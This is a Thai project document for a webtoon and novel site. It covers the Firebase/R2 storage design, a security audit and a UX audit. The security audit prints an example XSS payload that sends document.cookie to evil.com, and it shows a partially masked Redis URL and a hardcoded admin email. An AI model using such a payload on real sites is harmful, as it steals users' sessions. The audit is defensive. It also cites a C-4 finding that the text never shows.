# ReadChill Architecture & Storage Strategy

เอกสารนี้สรุปแนวคิดและสถาปัตยกรรมการจัดเก็บข้อมูลของโปรเจกต์ ReadChill เพื่อให้ง่ายต่อการดูแลและขยายสเกลในอนาคต

## 🏗️ โครงสร้างหลัก (The Perfect Combo)

เราใช้สูตร **Firebase (Database) + Cloudflare R2 (Object Storage)** ซึ่งเป็นมาตรฐานระดับอุตสาหกรรม (Industry Standard) ที่ช่วยให้ระบบทำงานได้เร็วที่สุด และประหยัดต้นทุนที่สุด

### 1. 🗄️ Firebase Firestore (เก็บข้อมูล ตัวหนังสือ ตัวเลข)
**หน้าที่หลัก:** เปรียบเสมือน "ตู้เอกสารแฟ้มประวัติ"
- เก็บข้อมูลโปรไฟล์ผู้ใช้งาน (Users)
- เก็บชื่อเรื่องการ์ตูน, นิยาย, เรื่องย่อ, ชื่อผู้แต่ง
- **เนื้อหานิยาย (Novel Text):** เนื่องจากเนื้อหานิยายเป็นตัวอักษร ล้วนๆ (Text/HTML) ซึ่งมีขนาดไฟล์เล็กมาก (หลัก KB) เราจึงเก็บเนื้อหาของแต่ละตอนลงใน Firebase Firestore ได้โดยตรง เพื่อความรวดเร็วในการดึงขึ้นมาอ่าน
- เก็บตัวเลขและสถิติ เช่น **ยอดวิว**, เรตติ้ง, จำนวนตอน
- เก็บข้อมูลระบบสมาชิก, ยอดเหรียญ, และประวัติการทำธุรกรรม (Transactions)

**ทำไมถึงใช้ Firebase?**
- รองรับการค้นหา (Query), จัดเรียง (Sort), และคัดกรอง (Filter) ข้อมูลได้อย่างรวดเร็ว
- รองรับการเกิด Transaction เช่น มีคน 1,000 คนเข้ามากดไลก์ หรือกดอ่านพร้อมกัน ระบบก็สามารถ +1 ยอดวิวได้อย่างแม่นยำ ไม่มีข้อมูลสูญหายหรือทับซ้อนกัน

---

### 2. ☁️ Cloudflare R2 (เก็บรูปการ์ตูน ไฟล์รูปภาพ วิดีโอหนักๆ)
**หน้าที่หลัก:** เปรียบเสมือน "โกดังเก็บของขนาดใหญ่"
- เก็บภาพปกการ์ตูน
- เก็บรูปภาพเนื้อหาการ์ตูนแต่ละตอน (ร้อยภาพ พันภาพ)
- เก็บไฟล์วิดีโอ หรือสื่อขนาดใหญ่ต่างๆ

**ทำไมถึงไม่ใช้ Firebase Storage / AWS S3 แต่เลือกใช้ R2?**
- **ฟรีค่าแบนด์วิดท์ขาออก (Zero Egress Fees):** นี่คือจุดแข็งที่สุด! เว็บไซต์อ่านการ์ตูนต้องมีการโหลดรูปเยอะมาก (1 ตอนอาจมีภาพ 50-100 รูป) หากใช้เจ้าอื่นจะโดนเก็บค่า "ปริมาณการดาวน์โหลด" ซึ่งแพงมากๆ แต่ Cloudflare R2 ให้บริการส่วนนี้ **ฟรี 100%**
- จ่ายเพียงแค่ "ค่าเช่าพื้นที่เก็บข้อมูล" ซึ่งมีราคาถูกมาก
- มีระบบ CDN (Content Delivery Network) ของ Cloudflare ในตัว ทำให้โหลดรูปภาพได้รวดเร็วจากทั่วโลก

---

## 🚫 ทำไมถึงไม่เอาทุกอย่างไปรวมใน R2 ที่เดียวจบ?
Cloudflare R2 หรือ Object Storage ไม่ได้ออกแบบมาเพื่อเก็บ "ข้อมูลที่มีการเปลี่ยนแปลงตลอดเวลา" (Dynamic Data) เช่น ยอดวิว
- หากนำยอดวิวไปเก็บใน R2 (เช่นทำไฟล์ data.json) เมื่อมีคนอ่านพร้อมกัน ระบบจะต้องดาวน์โหลดไฟล์นั้นมาแก้ไขตัวเลข แล้วอัปโหลดกลับไปใหม่ ซึ่งจะทำให้ **ข้อมูลพัง หรือเซฟทับกันมั่ว**
- ไม่สามารถทำระบบค้นหา (Search) หรือจัดอันดับ (Ranking) เช่น "การ์ตูนที่ยอดวิวสูงสุด 10 อันดับ" ได้หากใช้ Object Storage

## 💡 สรุป
- **ข้อมูลที่มีการเปลี่ยนแปลง, ตัวอักษร, การคำนวณ** 👉 โยนเข้า `Firebase`
- **ไฟล์รูปภาพหนักๆ, ทรัพยากรไฟล์** 👉 โยนเข้า `Cloudflare R2`

---

# 🔒 Security & UX/UI Audit Report

**วันที่ตรวจสอบ:** 10 กรกฎาคม 2026
**ขอบเขต:** Full-stack audit (Go Backend, Next.js Frontend, Firestore Rules, Storage Rules, UX/UI)

## 📊 สรุปภาพรวม

| ระดับความรุนแรง | จำนวน |
|---|---|
| 🔴 **Critical** (ต้องแก้ทันที) | 4 |
| 🟠 **High** (ควรแก้โดยเร็ว) | 7 |
| 🟡 **Medium** (ควรแก้ภายใน Sprint ถัดไป) | 5 |
| 🔵 **Low / UX** (ปรับปรุง) | 5 |

---

## 🔴 Critical Issues

### C-1: XSS (Cross-Site Scripting) ผ่าน `dangerouslySetInnerHTML`

**ไฟล์:** `readchill-frontend/src/app/webtoon/[id]/chapter/[chapterId]/page.tsx`

**ปัญหา:** Render HTML จาก database โดยไม่ sanitize → ผู้โจมตีสามารถใส่ `<script>` เพื่อขโมย token/session ของผู้อ่านทุกคนได้

```tsx
// ❌ ก่อนแก้
<div dangerouslySetInnerHTML={{ __html: chapterContent }} />
```

**ตัวอย่างการโจมตี:**
```html
<img src="x" onerror="fetch('https://evil.com/steal?token='+document.cookie)">
```

**แก้ไข:** ติดตั้ง `dompurify` และ sanitize ก่อน render เสมอ

```tsx
// ✅ หลังแก้
import DOMPurify from 'dompurify';

const sanitizedContent = DOMPurify.sanitize(chapterContent, {
  ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'em', 'strong', 'u', 'h1', 'h2', 'h3', 'blockquote', 'ul', 'ol', 'li', 'span'],
  ALLOWED_ATTR: ['class', 'style'],
  FORBID_TAGS: ['script', 'iframe', 'form', 'input', 'object', 'embed'],
  FORBID_ATTR: ['onerror', 'onclick', 'onload', 'onmouseover'],
});
<div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />
```

---

### C-2: Redis Credential Hardcode ใน `.env`

**ไฟล์:** `readchill-go-backend/.env`

**ปัญหา:** Password ของ Upstash Redis ถูกเก็บในไฟล์ที่อาจถูก commit เข้า Git

```env
# ❌ Password ถูก expose
REDIS_URL=rediss://default:AZwHAAI...@supreme-hornet-39943.upstash.io:6379
```

**แก้ไข:**
1. ตรวจสอบ Git history: `git log --all --full-history -- readchill-go-backend/.env`
2. ถ้า commit ไปแล้ว → Rotate Redis password ที่ Upstash Console ทันที
3. Production ให้ใช้ Google Secret Manager แทน `.env`

---

### C-3: Custom Token ถูกส่งผ่าน URL Query Parameter

**ไฟล์:** `readchill-frontend/src/app/profile/page.tsx` (L178)

**ปัญหา:** Token ปรากฏใน browser history, server logs, Referer header

```tsx
// ❌ Token อยู่ใน URL
window.open(`${adminUrl}/login?token=${data.token}`, '_blank');
```

**แก้ไข:** ใช้ `postMessage` ส่ง token แทน query parameter

```tsx
// ✅ ส่ง token ผ่าน postMessage
const adminWindow = window.open(`${adminUrl}/login`, '_blank');
const interval = setInterval(() => {
  if (adminWindow) {
    adminWindow.postMessage(
      { type: 'AUTH_TOKEN', token: data.token },
      adminUrl  // ระบุ origin ที่เจาะจง
    );
  }
}, 500);
setTimeout(() => clearInterval(interval), 10000);
```

---

### C-5: ไม่มี File Validation ทั้งขนาดและชนิดไฟล์

**ไฟล์:** `readchill-frontend/src/app/profile/page.tsx` (L80-91)

**ปัญหา:** ผู้ใช้สามารถอัปโหลดไฟล์ขนาดใดก็ได้ ไม่มีการตรวจสอบ MIME type หรือขนาดไฟล์

**แก้ไข:**
```tsx
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB
const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/webp', 'image/gif'];

// ✅ ตรวจสอบก่อนอัปโหลด
if (!ALLOWED_TYPES.includes(file.type)) { /* reject */ }
if (file.size > MAX_FILE_SIZE) { /* reject */ }
```

---

## 🟠 High Issues

### H-1: ไม่มี API Rate Limiting สำหรับ Payment Endpoints

**ไฟล์:** `readchill-go-backend/internal/routes/routes.go`

ทุก payment endpoint ไม่มี rate limiting → ผู้โจมตี spam request ได้

**แก้ไข:** ใช้ Fiber rate limiter middleware, จำกัด 10 requests/minute per user สำหรับ payment routes

---

### H-2: ไม่มี Security Headers

ไม่พบ `X-Frame-Options`, `X-Content-Type-Options`, `CSP`, `HSTS` ใดๆ ทั้งใน Go backend และ Next.js

**แก้ไข:** เพิ่ม security headers middleware ทั้ง Go backend (`c.Set(...)`) และ Next.js (`next.config.js` headers)

---

### H-3: Social Link ไม่มี URL Validation → Phishing / XSS

**ไฟล์:** `readchill-frontend/src/app/profile/page.tsx` (L319-329)

**ปัญหา:** ผู้ใช้สามารถตั้ง Facebook URL เป็น `javascript:alert(...)` หรือ URL phishing ได้

**แก้ไข:** Validate URL ด้วย `new URL()` + ตรวจ protocol เป็น `http:` หรือ `https:` เท่านั้น + เพิ่ม `rel="noopener noreferrer"`

---

### H-4: Firestore Rules ตรวจ Admin จาก Hardcoded Email

**ไฟล์:** `firestore.rules` (L19)

```
// ❌ ถ้า email ถูก compromise จะได้สิทธิ์ admin ทันที
request.auth.token.email == 'kittipan.g397@gmail.com'
```

**แก้ไข:** ลบ hardcoded email ออก ใช้แค่ `getUserData().role == 'admin'` หรือ Firebase Custom Claims (`request.auth.token.admin == true`)

---

### H-5: Storage Rules — ใครที่ login ก็ upload ไปยัง `/covers/` และ `/chapters/` ได้

**ไฟล์:** `storage.rules` (L16-25)

**ปัญหา:** ผู้ใช้ทั่วไปไม่ควร upload ไปยัง `/covers/` หรือ `/chapters/` — เฉพาะ partner/admin เท่านั้น

**แก้ไข:** เพิ่ม role check ผ่าน Firestore `get()` ใน storage rules

---

### H-6: Storage Rules — ไม่มี File Size Limit

ไม่มีการจำกัดขนาดไฟล์ใน Storage Rules → ผู้ใช้ upload ไฟล์ขนาดใหญ่มาก abuse storage quota ได้

**แก้ไข:** เพิ่ม `request.resource.size < 5 * 1024 * 1024` ในทุก storage rule

---

### H-7: Firestore — `user_inventory` อนุญาตให้ User เขียนเอง

**ไฟล์:** `firestore.rules` (L128-132)

**ปัญหา:** ผู้ใช้สามารถเปิด Browser Console เรียก Firestore SDK เพิ่ม item เข้า inventory โดยไม่ต้องจ่ายเหรียญ!

```
// ❌ ผู้ใช้เพิ่ม item ได้เอง
allow create, update: if isOwner(userId);
```

**แก้ไข:** เปลี่ยนเป็น `allow create, update: if false;` ให้เฉพาะ Admin SDK (Go backend) จัดการ

---

## 🟡 Medium Issues

| # | ปัญหา | ไฟล์ | แนวทาง | สถานะ (Status) |
|---|---|---|---|---|
| M-1 | Profile Form ไม่มี Input Validation (maxLength, pattern) | `profile/page.tsx` | เพิ่ม `maxLength`, URL pattern validation | `Open` |
| M-2 | `window.location.reload()` หลัง save สำเร็จ ทำลาย UX | `profile/page.tsx` L123, L149 | ใช้ `router.refresh()` แทน | `Open` |
| M-3 | ใช้ `alert()` แทน Toast notification | `profile/page.tsx` ทั่วทั้งไฟล์ | ใช้ `sonner` หรือ `react-hot-toast` | `Open` |
| M-4 | `console.log` leak ข้อมูลใน Production | `profile/page.tsx` L176, L185 | ลบออกหรือใช้ conditional logging | `Open` |
| M-5 | Firestore error details ถูก return ให้ client | `webtoon.go` L59 | Log server-side, return generic message | `Open` |

---

## 🔵 Low / UX Improvements

| # | ปัญหา | ไฟล์ | แนวทาง |
|---|---|---|---|
| L-1 | ไม่มี Loading Skeleton (แสดงแค่ "Loading...") | `profile/page.tsx` L74-76 | ใช้ Skeleton UI ด้วย `animate-pulse` |
| L-2 | Avatar ใช้ `ui-avatars.com` → Privacy risk | `profile/page.tsx` L256 | ใช้ CSS/Canvas สร้าง avatar จาก initials แทน |
| L-3 | Modal ไม่มี Focus Trap / Escape key | `profile/page.tsx` Cropper & Edit Modal | เพิ่ม `useEffect` ฟัง `Escape` key + `aria-modal` |
| L-4 | Stats (คอมเมนต์/ถูกใจ) Hardcode เป็น 0 | `profile/page.tsx` L290-300 | ซ่อนไว้ก่อนถ้ายังไม่ implement จริง |
| L-5 | `serviceAccountKey.json` อยู่ใน Repo | `readchill-go-backend/` | ตรวจว่าไม่ถูก commit + revoke ถ้าจำเป็น |

---

## 📋 ลำดับการแก้ไข (Action Priority)

| ลำดับ | Issue | ระดับ | ผลกระทบ |
|---|---|---|---|
| 1 | XSS via dangerouslySetInnerHTML | 🔴 Critical | ขโมย token/session ผู้ใช้ได้ |
| 2 | Redis credential ใน .env | 🔴 Critical | Database compromise |
| 3 | Custom Token in URL | 🔴 Critical | Account takeover |
| 4 | No file upload validation | 🔴 Critical | Storage abuse, DoS |
| 5 | No rate limiting on payments | 🟠 High | Financial abuse |
| 6 | No security headers | 🟠 High | Multiple attack vectors |
| 7 | Social link injection | 🟠 High | Phishing, XSS |
| 8 | Hardcoded admin email | 🟠 High | Privilege escalation |
| 9 | Storage write rules too open | 🟠 High | Unauthorized content upload |
| 10 | No storage file size limit | 🟠 High | Storage abuse |
| 11 | user_inventory writeable | 🟠 High | Free items bypass |
| 12-16 | Medium issues | 🟡 Medium | Code quality, data integrity |
| 17-21 | UX improvements | 🔵 Low | User experience |

> **💡 คำแนะนำ:** เริ่มจาก **C-1 (XSS)** เพราะ exploit ง่ายที่สุดและกระทบผู้ใช้ทุกคน จากนั้น **C-4 (CORS)** และ **H-7 (user_inventory)** เพราะเป็น financial impact โดยตรง

---

# 🎨 UX/UI Feature Audit Report (มุมมองผู้เชี่ยวชาญ)

**วันที่ตรวจสอบ:** 14 กรกฎาคม 2026  
**ขอบเขต:** readchill-frontend + readchill-admin  
**วิธีการ:** Static Code Analysis ทุกหน้า (page.tsx, component.tsx)

---

## 📌 สรุปภาพรวม

| หมวด | จำนวนปัญหา |
|---|---|
| 🔴 ฟีเจอร์ใช้ไม่ได้ / Broken | 8 |
| 🟠 บกพร่องด้าน UX ระดับสูง | 11 |
| 🟡 บกพร่องด้าน UX ระดับกลาง | 10 |
| ⚫ ส่วนที่ไม่จำเป็น / ควรตัดออก | 6 |

---

## 🔴 ฟีเจอร์ที่ใช้ไม่ได้ (Broken Features)

### F-1: ประวัติการอ่าน (Read History) ใช้ Mock Data ทั้งหมด

**ไฟล์:** `readchill-frontend/src/app/library/page.tsx` (L57-88)

**ปัญหา:** Tab "ประวัติการอ่าน" ใช้ข้อมูลปลอม hardcode ไว้ในโค้ด ไม่เชื่อมกับ API หรือ localStorage จริงเลย ผู้ใช้ทุกคนเห็นประวัติเดิมเสมอ (เรื่องสไลม์ และ Solo Leveling)

```tsx
// ❌ hardcoded mock data
const historyWebtoons = [
  { id: 'lD47y3pc5qlC6hBBQHtO', title: 'เกิดใหม่ทั้งทีก็เป็นสไลม์ไปซะแล้ว', ... },
  { id: '3BsOnQJ5GDS4KEfX3ap4', title: 'Solo Leveling - ลุยเดี่ยวอัพเลเวล', ... }
];
```

**แนวทางแก้ไข:** อ่าน `readHistory_${webtoonId}` จาก localStorage ที่บันทึกไว้ใน webtoon chapter page แล้วนำ webtoon ID ไป fetch ข้อมูลจาก API

---

### F-2: Unlocked Chapters แสดงชื่อเรื่องผิด (Hardcoded Title Mapping)

**ไฟล์:** `readchill-frontend/src/app/library/page.tsx` (L78-88)

**ปัญหา:** ชื่อเรื่องใน Tab "ตอนที่ปลดล็อก" ถูก hardcode เป็น if/else เฉพาะ 2 webtoon ID เท่านั้น หากผู้ใช้ซื้อตอนอื่นจะแสดงชื่อเป็น "จอมเวทย์ฝึกหัด" ทั้งหมด

```tsx
// ❌ hardcoded title lookup
webtoonTitle: webtoonId === 'lD47y3pc5qlC6hBBQHtO' ? 'เกิดใหม่...' : 'จอมเวทย์ฝึกหัด',
```

**แนวทางแก้ไข:** Batch fetch webtoon titles จาก API โดยใช้ webtoon IDs ที่ได้จาก `userData.unlockedChapters`

---

### F-3: Admin Dashboard KPI ทั้งหมด Hardcode เป็น 0

**ไฟล์:** `readchill-admin/src/app/dashboard/page.tsx` (L22, L37, L49)

**ปัญหา:** KPI Cards สำคัญ 3 ตัว (Total Revenue, Total Views, Your Content) แสดงค่า "0" และ "+0%" ทั้งหมด ไม่ได้ดึงข้อมูลจริงจาก Firestore หรือ API เลย

```tsx
// ❌ ทุก KPI เป็น 0 ทั้งหมด
<h3>฿0.00</h3>
<p>+0% from last month</p>
```

**แนวทางแก้ไข:** Fetch จาก Firestore aggregation หรือ Go backend analytics endpoint

---

### F-4: Admin Settings — บันทึกข้อมูลไม่ได้จริง

**ไฟล์:** `readchill-admin/src/app/dashboard/settings/page.tsx` (L19-22)

**ปัญหา:** ปุ่ม "Save Preferences" และ "Save Changes" ใน settings ทั้งหมด ทำแค่แสดง toast ข้อความ แต่ไม่ได้บันทึกอะไรลง Firestore หรือ backend จริง ๆ — ค่าจะหายเมื่อ refresh

```tsx
// ❌ ไม่มีการบันทึกจริง
const handleSave = () => {
  setSaveMessage("Settings saved successfully!");
  setTimeout(() => setSaveMessage(""), 3000);
};
```

---

### F-5: Admin Settings — Profile Form เป็น `disabled` ทั้งหมด

**ไฟล์:** `readchill-admin/src/app/dashboard/settings/page.tsx` (L115-130)

**ปัญหา:** Form fields ชื่อ Display Name และ Email ใน "My Profile" tab ถูก `disabled` ทั้งคู่ ผู้ใช้ไม่สามารถแก้ไขข้อมูลโปรไฟล์ใน admin panel ได้เลย

---

### F-6: Admin Settings — Notification Checkboxes ไม่บันทึกค่า

**ไฟล์:** `readchill-admin/src/app/dashboard/settings/page.tsx` (L184, L192)

**ปัญหา:** Checkbox ใช้ `defaultChecked` แทน controlled state ทำให้ค่าไม่ถูกบันทึกหรือ sync กับ backend ใด ๆ

---

### F-7: Topup — มีแพ็กเกจ ฿50 ซ้ำกัน 2 รายการ

**ไฟล์:** `readchill-frontend/src/app/topup/page.tsx` (L40-41)

**ปัญหา:** `packages` array มี entry สำหรับ ฿50 / 50 เหรียญ ซ้ำกันถึง 2 รายการ ทำให้ UI แสดงการ์ดซ้ำ ผู้ใช้อาจสับสน

```tsx
// ❌ มี 2 บรรทัดซ้ำ
{ baht: 50, coins: 50, bonus: 0 },
{ baht: 50, coins: 50, bonus: 0 },
```

---

### F-8: Profile Stats (คอมเมนต์ / ถูกใจ) Hardcode เป็น 0

**ไฟล์:** `readchill-frontend/src/app/profile/page.tsx` (L292-299)

**ปัญหา:** ตัวเลขสถิติโปรไฟล์ "คอมเมนต์" และ "ถูกใจที่ได้รับ" hardcode เป็น 0 ทุกคน ไม่ได้ดึงจาก Firestore จริง ทำให้ข้อมูลไม่ถูกต้อง

---

## 🟠 บกพร่องด้าน UX ระดับสูง

### U-1: ใช้ `alert()` ในหลายส่วน → ทำลาย UX

**ไฟล์:** `library/page.tsx`, `webtoon/[id]/page.tsx`, `content/page.tsx`, `inventory/page.tsx`

**ปัญหา:** ยังคงใช้ `alert()` ของ browser สำหรับ error/success messages ซึ่งดูเก่า บล็อก UI และไม่มี styling สอดคล้องกับ brand

**แนวทางแก้ไข:** ใช้ library เช่น `sonner` หรือ `react-hot-toast` ที่ติดตั้งอยู่แล้ว (ตรวจสอบ package.json)

---

### U-2: Loading State เป็นแค่ Spinner เปล่า ไม่มี Skeleton UI

**ไฟล์:** `library/page.tsx` L51-55, `inventory/page.tsx` L86-92, `webtoon/[id]/page.tsx` L91-95

**ปัญหา:** ทุกหน้าแสดง spinner เดี่ยว ๆ ตรงกลางหน้าขณะโหลด ทำให้เกิด Layout Shift และรู้สึก "โหลดช้า" ทั้งที่อาจแค่ดึงข้อมูลครั้งแรก

---

### U-3: ข้อความ Loading ไม่สม่ำเสมอ — ทั้ง Thai และ English

**ไฟล์:** `profile/page.tsx` L75, `dashboard/layout.tsx` L45

**ปัญหา:**
- Frontend: `Loading...` (ภาษาอังกฤษ)
- Admin: `Loading...` (ภาษาอังกฤษ)
- ควรเป็น i18n ที่สอดคล้องกันหรือสไตล์ Skeleton UI แทน

---

### U-4: Topup — ไม่มีการ Validate QR Slip ก่อน Submit

**ไฟล์:** `readchill-frontend/src/app/topup/page.tsx`

**ปัญหา:** ผู้ใช้สามารถอัปโหลด slip ภาพใด ๆ ก็ได้ ไม่มีการตรวจสอบ file type, ขนาดไฟล์, หรือว่าเป็นภาพ QR จริง นอกจากนี้ยังไม่มี preview ที่ชัดเจนก่อน confirm submit

---

### U-5: Admin Content — Tab "Novel" และ "Art" ไม่มี Chapter/Upload Flow ที่แตกต่างกัน

**ไฟล์:** `readchill-admin/src/app/dashboard/content/[id]/page.tsx`

**ปัญหา:** หน้า Chapter Manager detect ประเภทของ content (manga/novel/art) ได้ แต่ Form UI สำหรับ Novel ใช้ TipTap editor ที่ซ่อนอยู่ และ manga ใช้ image upload — แต่ Tab switching และ UX flow ไม่ชัดเจนว่า "ตอนนี้กำลังสร้างอะไร"

---

### U-6: Admin Sidebar — ไม่มี Active State Highlight

**ไฟล์:** `readchill-admin/src/app/dashboard/layout.tsx` (L61-93)

**ปัญหา:** Sidebar links ไม่มีการ highlight เพื่อบอกว่าหน้าไหนเป็น active page ปัจจุบัน ทุก link มี style เดียวกัน ผู้ใช้ไม่รู้ว่าอยู่หน้าใด

```tsx
// ❌ ไม่มี active class
<Link href="/dashboard" className="flex items-center gap-3 px-3 py-2.5 ...">
```

---

### U-7: ปุ่ม "ลบ" ไม่มี Confirmation Modal — ใช้ `confirm()` ของ browser

**ไฟล์:** `readchill-admin/src/app/dashboard/content/page.tsx` (L71), `partners/page.tsx`

**ปัญหา:** การลบผลงานใช้ `confirm()` ของ browser ซึ่งดูไม่ professional และไม่ match กับ design system ของ app

---

### U-8: Search — โหลดข้อมูลทั้งหมด 500 รายการมาไว้ที่ Client

**ไฟล์:** `readchill-frontend/src/app/search/page.tsx` (L45)

**ปัญหา:** Fetch webtoons 500 รายการมา filter ที่ client-side ทำให้โหลดช้า และ filter/search ไม่ scale เมื่อข้อมูลมีมากขึ้น ควรใช้ server-side search หรือ pagination แทน

```tsx
// ❌ ดึงข้อมูลมาทั้งหมด
const res = await fetch(`...?limit=500`);
```

---

### U-9: Home Page — `max-w-7xl mx-auto` ซ้อนกัน 2 ชั้นทำให้ padding ผิด

**ไฟล์:** `readchill-frontend/src/app/page.tsx` (L38, L41)

**ปัญหา:** `<main>` มี `max-w-7xl mx-auto px-4` แล้วยังมี `<div>` ลูกที่ซ้ำ class เดิมอีกชั้น ทำให้ padding ซ้ำ (double padding) บนมือถือ

```tsx
// ❌ double wrapper ทำให้ padding ผิด
<main className="max-w-7xl mx-auto px-4...">
  <div className="max-w-7xl mx-auto px-4...">  {/* ซ้ำ! */}
```

ปัญหาเดียวกันพบใน `novel/page.tsx` L33-34 และ `art/page.tsx` L33-34 ด้วย

---

### U-10: Admin Finance — Withdraw QR Upload ไปที่ `/api/upload` ของ Admin

**ไฟล์:** `readchill-admin/src/app/dashboard/finance/page.tsx` (L92-99)

**ปัญหา:** Partner อัปโหลด QR โอนเงินผ่าน `/api/upload` ซึ่งเป็น Cloudinary endpoint เดียวกับ cover art ทำให้ไฟล์สลิปการเงินปะปนกับ content ไฟล์

---

### U-11: Creator Profile Page — ไม่มีหน้าหลักสำหรับ Browse Creators

**ไฟล์:** `readchill-frontend/src/app/creator/[id]/page.tsx` (มีเฉพาะ detail)

**ปัญหา:** มีหน้า `/creator/[id]` สำหรับดูโปรไฟล์นักวาด แต่ไม่มีหน้า `/creator` หลักสำหรับ browse ค้นหา creator ทำให้ feature นี้เข้าถึงได้เฉพาะจาก link ตรงเท่านั้น

---

## 🟡 บกพร่องด้าน UX ระดับกลาง

| # | ปัญหา | ไฟล์ | แนวทาง |
|---|---|---|---|
| M-1 | HeroSection ปรากฏซ้ำทุก tab (Home/Novel/Art) — ผู้ใช้เห็น Hero ซ้ำทุกที่ที่นำทาง | `novel/page.tsx`, `art/page.tsx` | ย้าย HeroSection ไปใน Layout เฉพาะ Home page |
| M-2 | Tab เว็บตูน/นิยาย/ภาพวาด ไม่เก็บ filter state — กดค้นหาแล้วเปลี่ยน tab ข้อมูลหาย | `page.tsx`, `novel/page.tsx` | ใช้ URL query params เพื่อ persist state |
| M-3 | Pagination ไม่แสดงเลขหน้าปัจจุบัน — มีแค่ Next/Prev | `components/ui/Pagination.tsx` | เพิ่ม page indicator |
| M-4 | Library Tab "บันทึกแล้ว" ไม่มี loading skeleton ระหว่าง fetch | `library/page.tsx` | เพิ่ม Skeleton UI ขณะ fetch saved webtoons |
| M-5 | Profile page โหลดจาก `collection('webtoons')` แทน API endpoint | `profile/page.tsx` L55 | ใช้ Go API endpoint แทน Firestore client query ตรง |
| M-6 | Admin sidebar ถูกปิดได้ แต่ Layout Shift ทำให้ content กระโดด | `dashboard/layout.tsx` L55 | ใช้ CSS transform + overlay สำหรับ mobile แทน margin |
| M-7 | Topup PromptPay QR ใช้ billerId ที่ hardcode ไว้ — ไม่มี config | `topup/page.tsx` L161-163 | ย้าย billerId ไปใน environment variable |
| M-8 | Novel listing ใช้ `<WebtoonCard>` ที่ออกแบบมาสำหรับ manga — รูปแบบไม่เหมาะ | `novel/page.tsx` | ควรมี NovelCard component ที่มีรูปแบบ landscape/list view |
| M-9 | Search page — filter ด้าน Genre ไม่ตรงกับ tags ใน database (case-sensitive, spacing) | `search/page.tsx` | ทำ normalization ก่อน compare |
| M-10 | Admin — ไม่มี Pagination สำหรับ partner list และ content list เมื่อข้อมูลมาก | `content/page.tsx`, `partners/page.tsx` | เพิ่ม pagination หรือ infinite scroll |

---

## ⚫ ส่วนที่ไม่จำเป็น / ควรพิจารณาตัดออก

### R-1: ❌ Mock Data ใน Production Code (ควรลบออก)

**ไฟล์:** `library/page.tsx` L57-75

`historyWebtoons` array ที่ hardcode ไว้ควรลบออกทั้งหมด และแทนด้วย logic จริง ถ้า Read History ยังไม่พร้อม ควรแสดง Empty State แทน ไม่ใช่ mock data

---

### R-2: ❌ `/request` Page — ฟอร์มสมัคร Partner ซ้ำซ้อนกับ Admin Panel

**ไฟล์:** `readchill-frontend/src/app/request/page.tsx`

ฟอร์มสมัครเป็น Partner นี้ส่งข้อมูลไป Firestore `partner_requests` collection โดยตรง ซึ่งซ้อนซ้อนกับ workflow ที่ Admin จัดการใน Partners Management ได้ ควรพิจารณาว่า self-service form นี้ยังจำเป็นหรือไม่ (อาจ consolidate เป็น email-based workflow แทน)

---

### R-3: ❌ `Flame` และ `Eye` import ที่ไม่ถูกใช้

**ไฟล์:** `readchill-frontend/src/app/page.tsx` L4 (import `Flame`, `Eye` แต่ไม่ได้ใช้)

---

### R-4: ❌ Admin Settings — Notification Tab ไม่มี Backend

Tab "Notifications" มี checkbox แต่ไม่มี backend รองรับ และ `handleSave` ไม่ได้บันทึกอะไร ควรซ่อน tab นี้จนกว่าจะ implement จริง หรือลบออก

---

### R-5: ❌ `fix_urls.js` และ `replace.js` ที่ Root

**ไฟล์:** `/fix_urls.js`, `/replace.js`

Script ชั่วคราวสำหรับ migration/maintenance ที่ไม่ควรอยู่ใน repo หลัก ควรย้ายไป `/migration/` folder หรือลบออกหลังใช้งาน

---

### R-6: ⚠️ Admin `My Shop` — accessible สำหรับ Partner แต่ไม่มีใน Sidebar ชัดเจน

**ไฟล์:** `readchill-admin/src/app/dashboard/layout.tsx` L76-79

"My Shop" มีใน sidebar และ accessible สำหรับทั้ง admin และ partner แต่ UX ไม่ชัดว่า partner ควร manage shop ที่นี่หรือที่ frontend `/shop` ควร consolidate ให้มีที่เดียว

---

## 📋 ลำดับการแก้ไข UX/UI (Action Priority)

| ลำดับ | Issue | หมวด | เหตุผล |
|---|---|---|---|
| 1 | F-3: Admin KPI hardcode 0 | 🔴 Broken | Dashboard ใช้ตัดสินใจไม่ได้เลย |
| 2 | F-1: Library History mock data | 🔴 Broken | ละเมิด Project Rule: NO MOCK DATA |
| 3 | F-2: Unlocked chapters titles hardcode | 🔴 Broken | ข้อมูลผิดสำหรับผู้ใช้ที่ซื้อตอน |
| 4 | F-4/5/6: Admin Settings ทำงานไม่ได้ | 🔴 Broken | Settings page ไม่มีประโยชน์ |
| 5 | F-7: Topup package ซ้ำ | 🔴 Broken | UX สับสน + data bug |
| 6 | U-6: Sidebar ไม่มี active state | 🟠 High | Navigation ขาด feedback |
| 7 | U-1: ใช้ alert() ทั่วทั้ง app | 🟠 High | UX ไม่ consistent |
| 8 | U-9: double padding wrapper | 🟠 High | Layout ผิดบน mobile |
| 9 | U-8: Search โหลด 500 items | 🟠 High | Performance |
| 10 | R-1: ลบ Mock Data ออก | ⚫ Cleanup | ละเมิด Project Rule |
| 11-21 | Medium UX issues | 🟡 Medium | ทำตามลำดับ sprint |

> **📌 หมายเหตุสำคัญ:** Issues F-1, F-2 ละเมิด Project Rule "NO MOCK DATA" อย่างตรงไปตรงมา ควรแก้ไขทันที
